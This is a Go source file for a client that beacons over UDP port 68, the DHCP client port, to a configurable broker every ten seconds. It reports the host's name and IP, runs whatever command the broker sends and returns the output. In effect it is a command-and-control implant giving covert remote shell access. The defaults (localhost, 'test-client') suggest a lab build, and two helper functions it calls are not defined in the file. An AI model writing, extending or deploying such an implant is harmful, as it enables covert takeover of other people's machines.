package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

const (
	brokerIP   = "127.0.0.1" // change to server IP if remote
	serverPort = 68
	pollEvery  = 10 * time.Second
	readTO     = 3 * time.Second // how long to wait for server reply
	clientID   = "test-client"
)

type Payload struct {
	ClientID       string  `json:"clientID"`
	Action         string  `json:"command"`
	ActionID       *string `json:"commandID"`
	Args           *string `json:"args"`   // pointer allows null
	Output         *string `json:"output"` // pointer allows null
	IP             string  `json:"IP"`
	Hostname       string  `json:"hostname"`
	MessageCounter int     `json:"messageCounter"`
	ServerAddress  string  `json:"serverAddress"`
}

func runCommand(command string) string {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "no command provided"
	}

	cmd := exec.Command(parts[0], parts[1:]...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("error: %v\n%s", err, string(out))
	}
	return string(out)
}

func main() {

	messageCounter := 0

	serverAddr := &net.UDPAddr{
		IP:   net.ParseIP(brokerIP),
		Port: serverPort,
	}

	// Use ticker to perform the periodic transaction.
	ticker := time.NewTicker(pollEvery)
	defer ticker.Stop()

	// Run one immediately, then on each tick
	log.Printf("client: starting, will poll server %s every %v", serverAddr.String(), pollEvery)
	log.Printf("doing initial transaction\n")

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "error fetching hostname"
	}
	ip, err := getMyIP()
	if err != nil {
		log.Printf("error fetching local IP: %v", err)
		ip = "error fetching IP"
	}

	payload := Payload{
		ClientID:       clientID,
		ServerAddress:  brokerIP,
		Action:         "init",
		Args:           nil,
		ActionID:       nil,
		Output:         nil,
		IP:             ip,
		Hostname:       hostname,
		MessageCounter: messageCounter,
	}

	response := doTransaction(payload)
	log.Print(response)

	// allow clean shutdown
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case <-ticker.C:
			log.Printf("doing transaction\n")
			response = doTransaction(payload)
			json.Unmarshal([]byte(response), &payload) // update payload with any new command info
			messageCounter++
			payload.MessageCounter = messageCounter
			log.Print(response)
			if payload.Action == "run" && payload.Args != nil {
				fmt.Printf("Got command: %s %s\n", payload.Action, *payload.Args)
				output := runCommand(*payload.Args)
				payload.Output = &output
				payload.Action = "report"
				// Send result back
				payload.Output = &output
				doTransaction(payload)
			}
		case <-stop:
			log.Println("client: received shutdown signal, exiting")
			return
		}
	}
}
